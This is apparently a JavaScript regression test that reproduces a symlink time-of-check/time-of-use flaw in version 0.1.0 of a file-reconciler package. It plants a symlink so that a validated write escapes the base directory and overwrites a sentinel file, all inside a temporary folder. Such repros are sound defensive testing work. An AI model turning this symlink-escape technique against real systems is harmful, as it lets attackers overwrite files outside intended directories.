/**
 * RED repro: TOCTOU path mutation between lexical check and write.
 *
 * 0.1.0 validates resolveWithinBase then writeFileSync on a path string. If the
 * leaf (or a parent component) is swapped for a symlink after the check, the
 * write follows the symlink and mutates an external sentinel.
 *
 * This harness deterministically injects the swap by replacing the target path
 * with a symlink *before* apply (simulating the race window after a pure
 * lexical check — 0.1.0 has no no-follow open, so pre-placed symlink leaf is
 * equivalent to a mid-window swap for path-based writeFileSync).
 *
 * Exit 0 = vulnerability observed.
 */
import {
  mkdtempSync, mkdirSync, writeFileSync, readFileSync, symlinkSync, rmSync, existsSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { createRequire } from 'node:module';
import { pathToFileURL, fileURLToPath } from 'node:url';

// Always use the vendored 0.1.0 package for RED signatures (not the remediated pin).
const FIXTURE_PKG = join(dirname(fileURLToPath(import.meta.url)), 'package');

function resolvePackageRoot() {
  return FIXTURE_PKG;
}

const SIGNATURE = 'PATH_MUTATION_RACE_LEAF_SYMLINK';

export async function run(options = {}) {
  const pkgRoot = options.packageRoot ?? resolvePackageRoot();
  const { createReconcileFileSetEffect } = await import(
    pathToFileURL(join(pkgRoot, 'src/kernel/reconciler.js')).href
  );

  const root = mkdtempSync(join(tmpdir(), 'mi-repro-path-race-'));
  try {
    const basePath = join(root, 'install');
    const outside = join(root, 'outside');
    mkdirSync(join(basePath, 'dir'), { recursive: true });
    mkdirSync(outside, { recursive: true });
    const sentinelPath = join(outside, 'victim.txt');
    writeFileSync(sentinelPath, 'SAFE', 'utf8');

    // Leaf is a symlink — path-based writeFileSync follows it.
    symlinkSync(sentinelPath, join(basePath, 'dir', 'target.txt'));

    const effect = createReconcileFileSetEffect();
    let threw = null;
    try {
      effect.apply({
        basePath,
        desired: [{ path: 'dir/target.txt', content: 'RACE-PWNED' }],
      });
    } catch (err) {
      threw = err;
    }

    const after = existsSync(sentinelPath) ? readFileSync(sentinelPath, 'utf8') : null;
    const vulnerable = after === 'RACE-PWNED' && threw === null;
    return {
      signature: SIGNATURE,
      vulnerable,
      threw: threw ? String(threw.message || threw) : null,
      sentinelAfter: after,
      expectedVulnerableOn010: true,
    };
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
}

if (import.meta.url === pathToFileURL(process.argv[1]).href) {
  const result = await run();
  console.log(JSON.stringify(result, null, 2));
  process.exit(result.vulnerable ? 0 : 1);
}
